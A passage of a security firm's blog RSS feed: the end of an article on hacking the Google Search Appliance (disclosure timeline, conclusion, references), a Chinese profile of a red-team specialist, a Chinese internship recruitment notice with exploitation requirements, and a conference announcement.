      &lt;td&gt;2021/08/16&lt;/td&gt;
      &lt;td&gt;issuetracker.google.com assigned a issue.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/18&lt;/td&gt;
      &lt;td&gt;Google said issue is not severe enough to qualify for a reward, but VRP panel will take a closer look.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/08/20&lt;/td&gt;
      &lt;td&gt;VRP panel has decided that the security impact of this issue does not meet the bar for a financial reward.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/01&lt;/td&gt;
      &lt;td&gt;Asking if a vulnerability will be assigned a CVE identifier.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2021/11/02&lt;/td&gt;
      &lt;td&gt;Confirming that a CVE identifier will not be assigned.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;early 2023&lt;/td&gt;
      &lt;td&gt;Started writing this article&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2023/06/04&lt;/td&gt;
      &lt;td&gt;First draft completed.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;Although the GSA/vGSA is a product that has reached the end of its lifecycle, 
studying how Google increases product security and reduces attack vectors for devices can broaden our knowledge,
which we might not usually come into contact with. 
Although it is not detailed in this article, the Java Security Manager and the Linux Kernel’s seccomp are both technologies used in the GSA, 
and this research has also left some goals for further study:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The feedergate service listening on port 19900.&lt;/li&gt;
  &lt;li&gt;Memory vulnerabilities in Oracle’s Outside-in Technology for converting file formats.&lt;/li&gt;
  &lt;li&gt;The convert_to_html seccomp sandbox&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will share when there are some research results, See you next time.&lt;/p&gt;

&lt;h3 id=&quot;other-reference-links&quot;&gt;Other reference links&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&quot;&gt;https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/1333&quot;&gt;https://www.exploit-db.com/exploits/1333&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&quot;&gt;https://commons.erau.edu/cgi/viewcontent.cgi?article=1153&amp;amp;context=jdfsl&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.anandtech.com/show/2407&quot;&gt;https://www.anandtech.com/show/2407&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&quot;&gt;https://groups.google.com/g/google-search-appliance-help/c/Qn5aO5r2Joo/m/PTw8ZDWu6vYJ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/google/subpar&quot;&gt;https://github.com/google/subpar&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en/</link>
                <guid>https://devco.re/blog/2023/07/07/a-journey-into-hacking-google-search-appliance-en</guid>
                <pubDate>Fri, 07 Jul 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>從資安麻瓜到紅隊演練專家－Vtim</title>
                <description>&lt;p&gt;「提到駭客，你會想到誰？是《駭客任務》的尼歐、 V 怪客、《看臉時代》裡的小路、還是橘子？」紅隊演練專家 Vtim 笑著問道。&lt;/p&gt;

&lt;p&gt;目前於 DEVCORE 戴夫寇爾擔任紅隊演練專家的 Vtim，現年 27 歲，曾帶領過多次紅隊演練專案，擁有數十場紅隊演練經驗，也有豐富的資安競賽及國際企業漏洞獎勵計畫經驗，亦通過 OSCP、OSWE 認證，具備專業的 Web 檢測與內網滲透能力。「我其他身份是漏洞賞金獵人跟業餘 CTF 玩家！」Vtim說。&lt;/p&gt;

&lt;h3 id=&quot;ctf-意外得名--從此走上資安路&quot;&gt;CTF 意外得名  從此走上資安路&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/1.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;大學前兩年，Vtim 的課後活躍度遠高於課堂活躍度。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;「好像很多人覺得駭客就是敲敲鍵盤就能入侵了？但其實當駭客要學的東西實在太多了！」Vtim 邊說邊展示了一張密密麻麻的資安證照圖，最上面的小字則寫著「356 種證照」。大學時期就讀於國立成功大學資訊工程學系的 Vtim，坦言自己大學前兩年基本上都在翹課耍廢、忙著跑活動跟打電動，直到大三才開始好好努力、天天向上，閒著沒事就刷演算法題，大四暑假某天，室友隨口問他要不要一起參加「AIS3 新型態資安暑期課程」，沒有多想的他隨口答應後，才得知報名前要先考「CTF (Capture the Flag) pre-exam」。在此之前連「XSS」、「SQL Injection」都一問三不知的他，竟意外地拿下了第四名，自此開啟了他對資安的興趣。&lt;/p&gt;

&lt;p&gt;大四下學期，Vtim 卯起來找線上資安課程自學，學習各種入侵系統的原理以及攻擊手法，與此同時，室友則沉迷於 LOL 英雄聯盟，為了消除惱人的背景噪音，Vtim 試著以駭客的方式斷了室友網路。「結果他們就更吵了……一直在哀嚎！」他笑道。除此之外，他也開始試著自己打各種 CTF 線上比賽。特別的是，他沒有像其他人一樣組隊參賽累積更多分數，而是一個人摸索、學習別人的解題思路。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/2.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtim 大四下學會斷室友網路時使用的無線網卡。&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;漏洞獎勵漏洞比賽實戰證照一把罩&quot;&gt;漏洞獎勵、漏洞比賽、實戰證照一把罩&lt;/h3&gt;

&lt;p&gt;大學畢業後，Vtim 進入國立臺灣科技大學資訊管理系研究所資訊安全實驗室，由吳宗成教授指導。碩士時期，Vtim 順利通過徵選，連續成為教育部「資安人才培育計畫－資安實務導師制度－臺灣好厲駭」兩屆培訓學員，導師則分別是 DEVCORE 的執行長暨共同創辦人 Allen 及首席資安研究員 Orange（同時也是 Vtim 及許多人眼中的「傳奇滲透師」），也在此時認識了許多駭客大神。除此之外，他也開始嘗試破解靶機類型的題目，拓展原本僅限於 CTF 的解題題型。&lt;/p&gt;

&lt;p&gt;同一時間，Vtim 也進入了資安公司實習，主要負責滲透測試的執行。也是在實習後，他才明顯感受到企業真實環境與線上比賽的差異，例如企業不像靶機一定有洞、指定滲透的系統不見得熟悉。除此之外，如何將測試時的發現轉換為企業可理解的報告，也是平時自學時少有機會學習的技能。&lt;/p&gt;

&lt;p&gt;為了證明自己所學的價值，Vtim 開始參與漏洞獎勵計畫，並成功發現 LINE 的漏洞，取得人生中首次漏洞獎勵的成就，獲得了 1,000 美金的獎勵。與朋友組隊參加漏洞挖掘競賽，也順利奪冠。首次嘗試挑戰 OSCP （Offensive Security Certified Professional）實戰型證照，即順利通過。Vtim 補充，考生須在 24 小時打下 5 台機器，再花 24 小時寫一份滲透測試報告，是非常考驗體力跟能力的一張證照。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/3.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtim 首次嘗試挑戰 OSCP 實戰型證照，即順利通過。&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;同事強到不禁懷疑人生--第一線學高手思路不斷成長&quot;&gt;同事強到不禁懷疑人生  第一線學高手思路不斷成長&lt;/h3&gt;

&lt;p&gt;因為「所有技能點都點在攻擊」，Vtim 在研究所畢業後，尋找的也是攻擊測試相關工作。評估過後，履歷只投了 DEVCORE。「當時打 CTF 時很崇拜 Orange 跟 Angelboy，發現他們都在 DEVCORE，就覺得這間公司應該是台灣駭客技術最頂尖的，也希望能加入增強自己的實力！」他回憶。&lt;/p&gt;

&lt;p&gt;過五關斬六將後，Vtim 以紅隊演練專家的身份加入 DEVCORE。「一開始其實蠻挫折的，因為自己太缺乏後滲透需要的知識，經驗也不足。」Vtim 說，自己原本所學僅是單純打下主機，但實際打下主機後怎麼繞過防毒軟體、EDR、橫向移動、內網滲透，都是本來在打靶機題目較少學到的手法。此外，技術強大的同事群，也讓他不禁懷疑起自己的能力。&lt;/p&gt;

&lt;p&gt;但 Vtim 並未因挫折感而放棄，相反地，憑著對技術的熱情，不斷學習高手們的思路，他也不斷成長，讓自己越來越強大。「遇到困難時，我會想像這些人會怎麼做，藉此調整自己的心態和思路，在面對問題時不至於沒有方向或驚慌失措。」他由衷地說。DEVCORE 的前輩們也相當樂於分享，讓他逐漸找出解決問題的方法，也在眾多高手的刺激下，不斷精進自己。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/4.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;Vtim（後排左二）與同事於 DEVCORE 充電週密室逃脫，訓練解題能力。&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;紅隊演練成本高--駭客專攻網路邊界&quot;&gt;紅隊演練成本高  駭客專攻網路邊界&lt;/h3&gt;

&lt;p&gt;「紅隊演練」對很多人而言還是相當陌生，Vtim 解釋，紅隊演練其實是漏洞檢測服務的一種，漏洞檢測服務可分為弱點掃描、滲透測試、紅隊演練，其中紅隊演練是測試範圍最全面、最貼近現實駭客攻擊手法，且能發現營運層面缺失並檢視整體資安防禦機制，因此紅隊演練所需的人力門檻更高、使用資源更多，成本也是三者最高的。&lt;/p&gt;

&lt;p&gt;若要以一句話解釋紅隊演練，即是企業委任專業紅隊團隊，設法透過各種方式、甚至組合式的攻擊手法，模擬入侵企業，在時限內達成企業指定任務，如取得某台電腦的控制權或核心內網的機密資料等。他強調，許多企業將資安防禦重點放在核心網站及系統，對於駭客而言，若攻擊這類防守嚴密的區塊成本過高，則會將攻擊目標轉移到企業較網路邊界中防護較弱的系統。&lt;/p&gt;

&lt;p&gt;至於如何從找出網路邊界的系統進而入侵成功？他舉例，紅隊工作主要可以分成兩個階段，分別是取得外網進入點以及內網滲透，以第一階段的取得外網進入點而言，攻擊者會嘗試各種攻擊手法入侵企業內網，例如突破防守較薄弱的網路邊界主機，或從 GitHub 等線上軟體原始碼代管服務平台尋找企業洩漏的程式碼或機敏資訊以利用。此外，亦可能嘗試進行社交工程，寄送植入後門程式的釣魚信件，甚至實體前往目標公司附近進行 WiFi 封包的側錄及破解，待成功進入企業內網後，即開始第二階段的內網滲透，一步步從網路邊界進行橫向移動，最終入侵到核心網段，取得核心系統控制權或取得機密資料，達成任務目標。&lt;/p&gt;

&lt;h3 id=&quot;與新知及時限賽跑--熱情及解題能力很重要&quot;&gt;與新知及時限賽跑  熱情及解題能力很重要&lt;/h3&gt;

&lt;p&gt;對於這個職位的挑戰，Vtim 認真思考了一下，表示身為紅隊須不斷與新的技術賽跑，新的知識與架構日新月異，只能不斷持續學習與突破。此外，每次專案也都在嘗試突破自己的極限，常常遇到時限迫在眉睫但始終找不到進入點，最後才又「絕處逢生」，也需要承受一定程度的心理壓力。&lt;/p&gt;

&lt;p&gt;他認為，紅隊專家除了懂攻擊，還要懂得如何提供客戶專業的資安防禦建議，需要有綜觀全局的能力。「對客戶而言，攻擊不完全是重點，他們更想知道找到問題後如何緩解風險。」Vtim 表示。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230526/5.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;下班後的 Vtim 還與同事組成樂團，擔任 Bass 手的角色。&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;對於未來，Vtim 期待自己成為全能型的白帽駭客。「進攻過程會遇到很多不同的環境，不同攻擊階段也需要不同領域的技巧，我希望自己能掌握全部面向，獨力排解所有難題，達到『指哪打哪、攻擊自如』的境界。」他滿懷期待地說。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/05/26/from-cybersecurity-muggle-to-red-team-specialist-vtim/</link>
                <guid>https://devco.re/blog/2023/05/26/from-cybersecurity-muggle-to-red-team-specialist-vtim</guid>
                <pubDate>Fri, 26 May 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2023 第三屆實習生計畫</title>
                <description>&lt;p&gt;DEVCORE 創立迄今已逾十年，持續專注於提供主動式資安服務，並致力尋找各種安全風險及漏洞，讓世界變得更安全。為了持續尋找更多擁有相同理念的資安新銳、協助學生建構正確資安意識及技能，我們成立了「戴夫寇爾全國資訊安全獎學金」，2022 年初也開始舉辦首屆實習生計畫，目前為止成果頗豐、超乎預期，第二屆實習生計畫也將於今年 2 月底告一段落。我們很榮幸地宣佈，第三屆實習生計畫即將登場，若您期待加入我們、精進資安技能，煩請詳閱下列資訊後來信報名！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;實習內容&quot;&gt;實習內容&lt;/h3&gt;

&lt;p&gt;本次實習分為 Binary 及 Web 兩個組別，主要內容如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
以研究為主，在與導師確定研究標的後，分析目標架構、進行逆向工程或程式碼審查。藉由這個過程訓練自己的思路，找出可能的攻擊面與潛在的弱點。另外也會讓大家嘗試分析及寫過往漏洞的 Exploit，理解過去漏洞都出現在哪，體驗真實世界的漏洞都是如何利用。
    &lt;ul&gt;
      &lt;li&gt;漏洞挖掘及研究 70 %&lt;/li&gt;
      &lt;li&gt;1-day 開發 (Exploitation)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
主要內容為研究過往漏洞與近年常見新型態漏洞、攻擊手法，需要製作投影片介紹成果並建置可供他人重現弱點的模擬測試環境 (Lab)，另可能需要撰寫或修改可利用攻擊程式進行弱點驗證。
    &lt;ul&gt;
      &lt;li&gt;漏洞及攻擊手法研究 70%&lt;/li&gt;
      &lt;li&gt;建置 Lab 30%&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司地點&quot;&gt;公司地點&lt;/h3&gt;

&lt;p&gt;台北市松山區八德路三段 32 號 13 樓&lt;/p&gt;

&lt;h3 id=&quot;實習時間&quot;&gt;實習時間&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2023 年 3 月開始到 2023 年 7 月底，共 5 個月。&lt;/li&gt;
  &lt;li&gt;每週工作兩天，工作時間為 10:00 – 18:00
    &lt;ul&gt;
      &lt;li&gt;每週固定一天下午 14:00 - 18:00 必須到公司討論進度
        &lt;ul&gt;
          &lt;li&gt;如果居住雙北外可彈性調整(但須每個組別統一)&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;其餘時間皆為遠端作業&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;招募對象&quot;&gt;招募對象&lt;/h3&gt;

&lt;p&gt;大專院校大三（含）以上具有一定程度資安背景的學生&lt;/p&gt;

&lt;h3 id=&quot;預計招收名額&quot;&gt;預計招收名額&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Binary 組：2~3 人&lt;/li&gt;
  &lt;li&gt;Web 組：2~3 人&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;薪資待遇&quot;&gt;薪資待遇&lt;/h3&gt;

&lt;p&gt;每月新台幣 16,000 元&lt;/p&gt;

&lt;h2 id=&quot;招募條件資格與流程&quot;&gt;招募條件資格與流程&lt;/h2&gt;

&lt;h3 id=&quot;實習條件要求&quot;&gt;實習條件要求&lt;/h3&gt;

&lt;h4 id=&quot;binary&quot;&gt;Binary&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;基本逆向工程及除錯能力
    &lt;ul&gt;
      &lt;li&gt;能看懂組合語言並瞭解基本 Debugger 使用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本漏洞利用能力
    &lt;ul&gt;
      &lt;li&gt;須知道 Stack overflow、ROP 等相關利用技巧&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;基本 Scripting Language 開發能力
    &lt;ul&gt;
      &lt;li&gt;Python、Ruby&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備分析大型 Open Source 專案能力
    &lt;ul&gt;
      &lt;li&gt;以 C/C++ 為主&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備基礎作業系統知識
    &lt;ul&gt;
      &lt;li&gt;例如知道 Virtual Address 與 Physical Address 的概念&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Code Auditing
    &lt;ul&gt;
      &lt;li&gt;知道怎樣寫的程式碼會有問題
        &lt;ul&gt;
          &lt;li&gt;Buffer Overflow&lt;/li&gt;
          &lt;li&gt;Use After free&lt;/li&gt;
          &lt;li&gt;Race Condition&lt;/li&gt;
          &lt;li&gt;…&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;具備研究熱誠，習慣了解技術本質&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;CTF 比賽經驗&lt;/li&gt;
      &lt;li&gt;pwnable.tw 成績&lt;/li&gt;
      &lt;li&gt;樂於分享技術
        &lt;ul&gt;
          &lt;li&gt;有公開的技術 blog/slide、Write-ups 或是演講&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;精通 IDA Pro 或 Ghidra&lt;/li&gt;
      &lt;li&gt;有寫過 1-day 利用程式&lt;/li&gt;
      &lt;li&gt;具備下列其中之一經驗
        &lt;ul&gt;
          &lt;li&gt;Kernel Exploit&lt;/li&gt;
          &lt;li&gt;Windows Exploit&lt;/li&gt;
          &lt;li&gt;Browser Exploit&lt;/li&gt;
          &lt;li&gt;Bug Bounty&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;web&quot;&gt;Web&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;熟悉 OWASP Web Top 10。&lt;/li&gt;
  &lt;li&gt;理解 PortSwigger Web Security Academy 中所有的安全議題或已完成所有 Lab。
    &lt;ul&gt;
      &lt;li&gt;參考連結：https://portswigger.net/web-security/all-materials&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;理解計算機網路的基本概念。&lt;/li&gt;
  &lt;li&gt;熟悉 Command Line 操作，包含 Unix-like 和 Windows 作業系統的常見或內建系統指令工具。&lt;/li&gt;
  &lt;li&gt;熟悉任一種網頁程式語言（如：PHP、ASP.NET、JSP），具備可以建立完整網頁服務的能力。&lt;/li&gt;
  &lt;li&gt;熟悉任一種 Scripting Language（如：Shell Script、Python、Ruby），並能使用腳本輔以研究。&lt;/li&gt;
  &lt;li&gt;具備除錯能力，能善用 Debugger 追蹤程式流程、能重現並收斂問題。&lt;/li&gt;
  &lt;li&gt;具備可以建置、設定常見網頁伺服器（如：Nginx、Apache）及作業系統（如：Linux）的能力。&lt;/li&gt;
  &lt;li&gt;具備追根究柢的精神。&lt;/li&gt;
  &lt;li&gt;加分但&lt;strong&gt;非必要&lt;/strong&gt;條件
    &lt;ul&gt;
      &lt;li&gt;曾經獨立挖掘過 0-day 漏洞。&lt;/li&gt;
      &lt;li&gt;曾經獨立分析過已知漏洞並能撰寫 1-day exploit。&lt;/li&gt;
      &lt;li&gt;曾經於 CTF 比賽中擔任出題者並建置過題目。&lt;/li&gt;
      &lt;li&gt;擁有 OSCP 證照或同等能力之證照。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;應徵流程&quot;&gt;應徵流程&lt;/h3&gt;

&lt;p&gt;本次甄選一共分為三個階段：&lt;/p&gt;

&lt;h4 id=&quot;第一階段書面審查&quot;&gt;第一階段：書面審查&lt;/h4&gt;

&lt;p&gt;第一階段為書面審查，會需要審查下列兩個項目&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;書面審查&lt;/li&gt;
  &lt;li&gt;簡答題及實作題答案
    &lt;ul&gt;
      &lt;li&gt;應徵 Binary 實習生需額外在履歷附上下述問題答案
        &lt;ul&gt;
          &lt;li&gt;簡答題
            &lt;ul&gt;
              &lt;li&gt;請提出三個，你印象最深刻或感到有趣、於西元 2020 ~ 2023 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解簡述說明各個漏洞的成因、利用條件和可以造成的影響。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;實作題目
            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;/assets/files/recruit/binary/2022_Intern_Challenge-2.zip&quot;&gt;題目檔案&lt;/a&gt;
                &lt;ul&gt;
                  &lt;li&gt;為一個互動式的 Server，可透過網路連線與之互動。&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;請分析上述所提供的 Server，並利用其中的漏洞在 Windows 11 上跳出 calc.exe。
                &lt;ul&gt;
                  &lt;li&gt;漏洞可能有很多，不一定每個都可以利用。&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
              &lt;li&gt;請務必寫下解題過程及如何去分析這個 Server，並交 write-up，請盡你所能來解題，即使最後沒有成功，也請寫下您所嘗試過的方法及思路，本測驗將會以 write-up 為主要依據。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;應徵 Web 實習生需額外在履歷附上下述問題答案
        &lt;ul&gt;
          &lt;li&gt;簡答題
            &lt;ul&gt;
              &lt;li&gt;請提出三個，你印象最深刻或感到有趣、於西元 2020 ~ 2023 年間公開的真實漏洞或攻擊鏈案例，並依自己的理解簡述說明各個漏洞的成因、利用條件和可以造成的影響。&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;本階段收件截止時間為 &lt;strong&gt;2023/2/3 10:00&lt;/strong&gt;，我們會根據您的履歷及題目所回答的內容來決定是否有通過第一階段，我們會在七個&lt;strong&gt;工作天&lt;/strong&gt;內回覆。&lt;/p&gt;

&lt;h4 id=&quot;第二階段能力測驗&quot;&gt;第二階段：能力測驗&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;Binary
    &lt;ul&gt;
      &lt;li&gt;無&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Web
    &lt;ul&gt;
      &lt;li&gt;第二階段會根據您的履歷或是任何可證明具備足夠 Web 滲透相關技能的資料來決定是否需要另外做題目，如果未達標準會另外準備靶機測驗，待我們收到解題過程後，將會根據您的狀況決定是否可以進入第三階段。&lt;/li&gt;
      &lt;li&gt;本階段收件時間為 &lt;strong&gt;2023/2/5 23:59&lt;/strong&gt;，建議提早遞交履歷，可以提前作答。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;第三階段面試&quot;&gt;第三階段：面試&lt;/h4&gt;
&lt;p&gt;此階段為 1~2 小時的面試，會有 2~3 位資深夥伴參與，評估您是否具備本次實習所需的技術能力與人格特質。&lt;/p&gt;

&lt;h3 id=&quot;報名方式&quot;&gt;報名方式&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;請將您的&lt;strong&gt;履歷&lt;/strong&gt;及&lt;strong&gt;題目答案&lt;/strong&gt;以 PDF 格式寄到 recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
      &lt;li&gt;請於 &lt;strong&gt;2023/02/03 10:00&lt;/strong&gt; 前寄出（如果名額已滿則視情況提早結束）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;信件標題格式：[應徵] 職位 您的姓名（範例：[應徵] Web 組實習生 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在三頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;實習經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;過去對於資安的相關研究&lt;/li&gt;
      &lt;li&gt;對於這份實習的期望&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;若有應徵相關問題，請一律使用 Email 聯繫，如造成您的不便請見諒，我們感謝您的來信，並期待您的加入！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/01/14/3rd-internship-program-recruit/</link>
                <guid>https://devco.re/blog/2023/01/14/3rd-internship-program-recruit</guid>
                <pubDate>Sat, 14 Jan 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE CONFERENCE 2023 即日起開放報名</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.7em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;DEVCORE 很高興地宣佈，純攻擊導向的專業技術研討會 DEVCORE CONFERENCE，在暌違三年後，將於 3 月 10 日至 ３ 月 11 日於台北 TICC 國際會議中心再次盛大舉行，即日起開放報名，同時為慶祝 DEVCORE 創立十週年，除了原有的駭客技術議程外，特別加開企業場。&lt;/p&gt;

&lt;p&gt;「DEVCORE 十年來持續提供企業頂尖的主動式資安服務，很高興看到資安與紅隊演練日漸受到台灣業界與政府單位重視，希望將我們一路累積的經驗與能量，不藏私地分享給所有志同道合的夥伴，共同為台灣資安產業的發展並肩作戰。」執行長暨共同創辦人翁浩正（Allen）表示。&lt;/p&gt;

&lt;p&gt;紅隊總監暨共同創辦人許復凱（Shaolin）則強調，目前台灣僅有 DEVCORE 願意公開分享紅隊進階攻擊技法，機會相當難得，而此場研討會不僅適合希望更加深入了解攻擊技術的聽眾，也很適合企業藍隊藉此了解紅隊如何看待防禦，從中獲得啟發，以了解可以強化的防禦面向，現場也將與聽眾交流技術及駭客思維。&lt;/p&gt;

&lt;p&gt;針對駭客場，許復凱分析，上半場將於聽眾分享紅隊在真實演練時如何運用企業與藍隊難以想像的攻擊手法，下半場則著重分享 DEVCORE 團隊對真實世界產品的研究手法，甚至也有全球白帽駭客最高殿堂 Pwn2Own 等參賽背後秘辛與趣事，場場精華，不容錯過。&lt;/p&gt;

